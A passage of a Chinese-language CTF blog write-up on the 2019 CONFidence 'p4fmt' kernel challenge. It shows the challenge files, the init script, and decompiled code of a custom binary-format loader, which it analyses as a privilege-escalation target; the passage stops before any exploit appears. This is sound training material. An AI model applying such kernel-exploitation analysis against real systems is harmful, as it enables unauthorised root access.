<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="referrer" content="no-referrer" />
    <meta name="description" content="周末p4主办的比赛，主要分析一下其中的一道Kernel PWN和一道逆向 p4fmtAnalyze拿到题目，解压后一共三个文件： 123bzImage#内核映像initramfs.cpio.gz#文件系统run.sh#qemu启动脚本 qemu启动脚本启动后看到： 123456789101112&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&amp;#x3">
<meta property="og:type" content="article">
<meta property="og:title" content="Teaser CONFidence CTF 2019 p4fmt&amp;&amp;oldschool">
<meta property="og:url" content="http://yoursite.com/2019/03/23/Teaser-CONFidence-CTF-2019-p4fmt-oldschool/index.html">
<meta property="og:site_name" content="Kirin&#39;s Blog">
<meta property="og:description" content="周末p4主办的比赛，主要分析一下其中的一道Kernel PWN和一道逆向 p4fmtAnalyze拿到题目，解压后一共三个文件： 123bzImage#内核映像initramfs.cpio.gz#文件系统run.sh#qemu启动脚本 qemu启动脚本启动后看到： 123456789101112&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&amp;#x3">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2019-03-22T16:12:29.000Z">
<meta property="article:modified_time" content="2019-03-31T04:15:38.000Z">
<meta property="article:author" content="Kirin">
<meta property="article:tag" content="Re">
<meta property="article:tag" content="Kernel PWN">
<meta name="twitter:card" content="summary">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>Teaser CONFidence CTF 2019 p4fmt&amp;&amp;oldschool</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
<meta name="generator" content="Hexo 4.2.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2019/03/25/TCTF-2019-PWN/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2019/03/22/KCTF-2019-Q1/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/03/23/Teaser-CONFidence-CTF-2019-p4fmt-oldschool/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/03/23/Teaser-CONFidence-CTF-2019-p4fmt-oldschool/&text=Teaser CONFidence CTF 2019 p4fmt&amp;&amp;oldschool" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/03/23/Teaser-CONFidence-CTF-2019-p4fmt-oldschool/&title=Teaser CONFidence CTF 2019 p4fmt&amp;&amp;oldschool" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/03/23/Teaser-CONFidence-CTF-2019-p4fmt-oldschool/&is_video=false&description=Teaser CONFidence CTF 2019 p4fmt&amp;&amp;oldschool" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Teaser CONFidence CTF 2019 p4fmt&amp;&amp;oldschool&body=Check out this article: http://yoursite.com/2019/03/23/Teaser-CONFidence-CTF-2019-p4fmt-oldschool/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/03/23/Teaser-CONFidence-CTF-2019-p4fmt-oldschool/&title=Teaser CONFidence CTF 2019 p4fmt&amp;&amp;oldschool" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/03/23/Teaser-CONFidence-CTF-2019-p4fmt-oldschool/&title=Teaser CONFidence CTF 2019 p4fmt&amp;&amp;oldschool" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/03/23/Teaser-CONFidence-CTF-2019-p4fmt-oldschool/&title=Teaser CONFidence CTF 2019 p4fmt&amp;&amp;oldschool" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/03/23/Teaser-CONFidence-CTF-2019-p4fmt-oldschool/&title=Teaser CONFidence CTF 2019 p4fmt&amp;&amp;oldschool" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/03/23/Teaser-CONFidence-CTF-2019-p4fmt-oldschool/&name=Teaser CONFidence CTF 2019 p4fmt&amp;&amp;oldschool&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#p4fmt"><span class="toc-number">1.</span> <span class="toc-text">p4fmt</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyze"><span class="toc-number">1.1.</span> <span class="toc-text">Analyze</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Debug"><span class="toc-number">1.2.</span> <span class="toc-text">Debug</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">1.3.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Oldschool"><span class="toc-number">2.</span> <span class="toc-text">Oldschool</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        Teaser CONFidence CTF 2019 p4fmt&amp;&amp;oldschool
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Kirin's Blog</span>
      </span>
      
    <div class="postdate">
        <time datetime="2019-03-22T16:12:29.000Z" itemprop="datePublished">2019-03-23</time>
    </div>


      

      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/Kernel-PWN/" rel="tag">Kernel PWN</a>, <a class="tag-link" href="/tags/Re/" rel="tag">Re</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p>周末p4主办的比赛，主要分析一下其中的一道Kernel PWN和一道逆向</p>
<h2 id="p4fmt"><a href="#p4fmt" class="headerlink" title="p4fmt"></a>p4fmt</h2><h3 id="Analyze"><a href="#Analyze" class="headerlink" title="Analyze"></a>Analyze</h3><p>拿到题目，解压后一共三个文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bzImage#内核映像</span><br><span class="line">initramfs.cpio.gz#文件系统</span><br><span class="line">run.sh#qemu启动脚本</span><br></pre></td></tr></table></figure>
<p>qemu启动脚本启动后看到：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">p4fmt</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">Kernel challs are always a bit painful.</span><br><span class="line">No internet access, no SSH, no file copying.</span><br><span class="line"></span><br><span class="line">You&#39;re stuck with copy pasting base64&#39;d (sometimes static) ELFs.</span><br><span class="line">But what if there was another solution?</span><br><span class="line"></span><br><span class="line">We&#39;ve created a lightweight, simple binary format for your</span><br><span class="line">pwning pleasure. It&#39;s time to prove your skills.</span><br></pre></td></tr></table></figure>
<p>根据信息，是一道kernel pwn，flag在根目录，但是只有root可读，需要我们提升权限<br>且内部定义了一种可执行文件格式<br>查看文件系统的init脚本：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;sh</span><br><span class="line"></span><br><span class="line">mount -t proc none &#x2F;proc</span><br><span class="line">mount -t sysfs none &#x2F;sys</span><br><span class="line">insmod  &#x2F;p4fmt.ko  </span><br><span class="line"></span><br><span class="line">sleep 2</span><br><span class="line"></span><br><span class="line">ln -s &#x2F;dev&#x2F;console &#x2F;dev&#x2F;ttyS0</span><br><span class="line"></span><br><span class="line">cat &lt;&lt;EOF</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">p4fmt</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">Kernel challs are always a bit painful.</span><br><span class="line">No internet access, no SSH, no file copying.</span><br><span class="line"></span><br><span class="line">You&#39;re stuck with copy pasting base64&#39;d (sometimes static) ELFs.</span><br><span class="line">But what if there was another solution?</span><br><span class="line"></span><br><span class="line">We&#39;ve created a lightweight, simple binary format for your</span><br><span class="line">pwning pleasure. It&#39;s time to prove your skills.</span><br><span class="line"></span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">setsid cttyhack su pwn</span><br><span class="line">poweroff -f</span><br></pre></td></tr></table></figure>
<p>注意两个地方：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">insmod  &#x2F;p4fmt.ko   加载了p4fmt模块</span><br><span class="line">setsid cttyhack su pwn  以pwn用户启动</span><br></pre></td></tr></table></figure>
<p>首先提取p4fmt模块binary：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gunzip .&#x2F;initramfs.cpio.gz</span><br><span class="line">cpio -idmv &lt; initramfs.cpio</span><br></pre></td></tr></table></figure>
<p>拿到文件后，ida分析<br>看到其定义的p4fmt可执行文件格式以及载入过程：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">load_p4_binary</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 v1; <span class="comment">// rcx</span></span><br><span class="line">  _BYTE *v2; <span class="comment">// rsi</span></span><br><span class="line">  __int64 v3; <span class="comment">// r12</span></span><br><span class="line">  __int64 v4; <span class="comment">// rbx</span></span><br><span class="line">  _BYTE *v5; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// r14</span></span><br><span class="line">  <span class="keyword">bool</span> v7; <span class="comment">// cf</span></span><br><span class="line">  <span class="keyword">bool</span> v8; <span class="comment">// zf</span></span><br><span class="line">  __int64 v9; <span class="comment">// r13</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v10; <span class="comment">// ebp</span></span><br><span class="line">  <span class="keyword">char</span> v12; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v13; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v14; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v15; <span class="comment">// rax</span></span><br><span class="line">  map_info *v16; <span class="comment">// r12</span></span><br><span class="line">  __int64 v17; <span class="comment">// ST00_8</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v18; <span class="comment">// r14</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v19; <span class="comment">// r15</span></span><br><span class="line">  __int64 v20; <span class="comment">// r9</span></span><br><span class="line">  __int64 v21; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v22; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v23; <span class="comment">// r8</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="number">2L</span>L;</span><br><span class="line">  v2 = &amp;fmt_header;</span><br><span class="line">  v3 = a1 + <span class="number">0x48</span>;</span><br><span class="line">  v4 = a1;</span><br><span class="line">  v5 = (_BYTE *)(a1 + <span class="number">0x48</span>);</span><br><span class="line">  v6 = __readgsqword((<span class="keyword">unsigned</span> __int64)&amp;current_task);</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v9 = *(_QWORD *)(v6 + <span class="number">0x2A0</span>);</span><br><span class="line">  <span class="keyword">do</span>                                            <span class="comment">// cmp headers</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !v1 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v7 = *v2 &lt; *v5;</span><br><span class="line">    v8 = *v2++ == *v5++;</span><br><span class="line">    --v1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v8 );</span><br><span class="line">  <span class="keyword">if</span> ( (!v7 &amp;&amp; !v8) != v7 )</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="number">-8</span>;</span><br><span class="line">  JUMPOUT(*(_BYTE *)(v4 + <span class="number">0x4A</span>), <span class="number">0</span>, load_p4_binary_cold_2);<span class="comment">// cmp \x00-&gt;version</span></span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)(v4 + <span class="number">0x4B</span>) &gt; <span class="number">1u</span> )</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="number">-22</span>;</span><br><span class="line">  v10 = flush_old_exec(v4, v2);                 <span class="comment">// clear the environment</span></span><br><span class="line">  <span class="keyword">if</span> ( !v10 )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)(v6 + <span class="number">0x80</span>) = <span class="number">0x800000</span>;</span><br><span class="line">    setup_new_exec(v4);</span><br><span class="line">    v12 = *(_BYTE *)(v4 + <span class="number">0x4B</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v12 )                                  <span class="comment">// type=1</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v12 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="number">-22</span>;</span><br><span class="line">      <span class="keyword">if</span> ( *(_DWORD *)(v4 + <span class="number">0x4C</span>) )             <span class="comment">// map_time</span></span><br><span class="line">      &#123;</span><br><span class="line">        v16 = (map_info *)(*(_QWORD *)(v4 + <span class="number">0x50</span>) + v3);<span class="comment">// map_info_offset</span></span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          v17 = v16-&gt;load_addr;</span><br><span class="line">          v18 = v16-&gt;load_addr &amp; <span class="number">7</span>;</span><br><span class="line">          v19 = v16-&gt;load_addr &amp; <span class="number">0xFFFFFFFFFFFFF000</span>LL;</span><br><span class="line">          printk(</span><br><span class="line">            <span class="string">"vm_mmap(load_addr=0x%llx, length=0x%llx, offset=0x%llx, prot=%d)\n"</span>,</span><br><span class="line">            v19,</span><br><span class="line">            v16-&gt;length,</span><br><span class="line">            v16-&gt;offset,</span><br><span class="line">            v18);</span><br><span class="line">          v20 = v16-&gt;offset;</span><br><span class="line">          v21 = v16-&gt;length;</span><br><span class="line">          <span class="keyword">if</span> ( v17 &amp; <span class="number">8</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            vm_mmap(<span class="number">0L</span>L, v19, v21, (<span class="keyword">unsigned</span> __int8)v18, <span class="number">2L</span>L, v20);</span><br><span class="line">            printk(<span class="string">"clear_user(addr=0x%llx, length=0x%llx)\n"</span>, v16-&gt;load_addr, v16-&gt;length, v22, v23);</span><br><span class="line">            _clear_user(v16-&gt;load_addr, v16-&gt;length);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            vm_mmap(*(_QWORD *)(v4 + <span class="number">8</span>), v19, v21, (<span class="keyword">unsigned</span> __int8)v18, <span class="number">2L</span>L, v20);</span><br><span class="line">          &#125;</span><br><span class="line">          ++v10;</span><br><span class="line">          ++v16;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( *(_DWORD *)(v4 + <span class="number">0x4C</span>) &gt; v10 );</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>                                        <span class="comment">//type=0</span></span><br><span class="line">    &#123;</span><br><span class="line">      v13 = <span class="number">-12L</span>L;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)vm_mmap(</span><br><span class="line">                               *(_QWORD *)(v4 + <span class="number">8</span>),</span><br><span class="line">                               *(_QWORD *)(v4 + <span class="number">80</span>),</span><br><span class="line">                               <span class="number">4096L</span>L,</span><br><span class="line">                               *(_QWORD *)(v4 + <span class="number">80</span>) &amp; <span class="number">7L</span>L,</span><br><span class="line">                               <span class="number">2L</span>L,</span><br><span class="line">                               <span class="number">0L</span>L) &gt; <span class="number">0xFFFFFFFFFFFFF000</span>LL )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_12:</span><br><span class="line">        install_exec_creds(v4);</span><br><span class="line">        set_binfmt(&amp;p4format);</span><br><span class="line">        v14 = <span class="number">0x7FFFFFFFF000</span>LL;</span><br><span class="line">        v15 = __readgsqword((<span class="keyword">unsigned</span> __int64)&amp;current_task);</span><br><span class="line">        <span class="keyword">if</span> ( *(_QWORD *)v15 &amp; <span class="number">0x20000000</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v14 = <span class="number">0xC0000000</span>LL;</span><br><span class="line">          <span class="keyword">if</span> ( !(*(_BYTE *)(v15 + <span class="number">131</span>) &amp; <span class="number">8</span>) )</span><br><span class="line">            v14 = <span class="number">0xFFFFE000</span>LL;</span><br><span class="line">        &#125;</span><br><span class="line">        v10 = setup_arg_pages(v4, v14, <span class="number">0L</span>L);</span><br><span class="line">        <span class="keyword">if</span> ( !v10 )</span><br><span class="line">        &#123;</span><br><span class="line">          finalize_exec(v4);</span><br><span class="line">          start_thread(</span><br><span class="line">            v9 + <span class="number">16216</span>,</span><br><span class="line">            v13,</span><br><span class="line">            *(_QWORD *)(*(_QWORD *)(__readgsqword((<span class="keyword">unsigned</span> __int64)&amp;current_task) + <span class="number">0x100</span>) + <span class="number">0x28</span>LL));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> v10;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    v13 = *(_QWORD *)(v4 + <span class="number">88</span>);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到：<br>首先检验文件头是否为”P4”以及version是否为0<br>而后调用一次flush_old_exec清理空间<br>而后通过version后一字节判断type来确定加载方式<br>注意到第一种加载方式：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v12 )                                  <span class="comment">// type=1</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( v12 != <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="number">-22</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)(v4 + <span class="number">0x4C</span>) )             <span class="comment">// map_time</span></span><br><span class="line">  &#123;</span><br><span class="line">    v16 = (map_info *)(*(_QWORD *)(v4 + <span class="number">0x50</span>) + v3);<span class="comment">// map_info_offset</span></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v17 = v16-&gt;load_addr;</span><br><span class="line">      v18 = v16-&gt;load_addr &amp; <span class="number">7</span>;</span><br><span class="line">      v19 = v16-&gt;load_addr &amp; <span class="number">0xFFFFFFFFFFFFF000</span>LL;</span><br><span class="line">      printk(</span><br><span class="line">        <span class="string">"vm_mmap(load_addr=0x%llx, length=0x%llx, offset=0x%llx, prot=%d)\n"</span>,</span><br><span class="line">        v19,</span><br><span class="line">        v16-&gt;length,</span><br><span class="line">        v16-&gt;offset,</span><br><span class="line">        v18);</span><br><span class="line">      v20 = v16-&gt;offset;</span><br><span class="line">      v21 = v16-&gt;length;</span><br><span class="line">      <span class="keyword">if</span> ( v17 &amp; <span class="number">8</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        vm_mmap(<span class="number">0L</span>L, v19, v21, (<span class="keyword">unsigned</span> __int8)v18, <span class="number">2L</span>L, v20);</span><br><span class="line">        printk(<span class="string">"clear_user(addr=0x%llx, length=0x%llx)\n"</span>, v16-&gt;load_addr, v16-&gt;length, v22, v23);</span><br><span class="line">        _clear_user(v16-&gt;load_addr, v16-&gt;length);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        vm_mmap(*(_QWORD *)(v4 + <span class="number">8</span>), v19, v21, (<span class="keyword">unsigned</span> __int8)v18, <span class="number">2L</span>L, v20);</span><br><span class="line">      &#125;</span><br><span class="line">      ++v10;</span><br><span class="line">      ++v16;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( *(_DWORD *)(v4 + <span class="number">0x4C</span>) &gt; v10 );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先会通过type后一字节决定操作次数<br>而后通过一个map_info结构体来调用vm_mmap和clear_user<br>其中会把调用参数通过printk输出<br>map_info:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00000000 map_info        struc ; (sizeof&#x3D;0x18, mappedto_3)</span><br><span class="line">00000000 load_addr       dq ?</span><br><span class="line">00000008 length          dq ?</span><br><span class="line">00000010 offset          dq ?</span><br><span class="line">00000018 map_info        ends</span><br></pre></td></tr></table></figure>
<p>同时可以看到：</p>
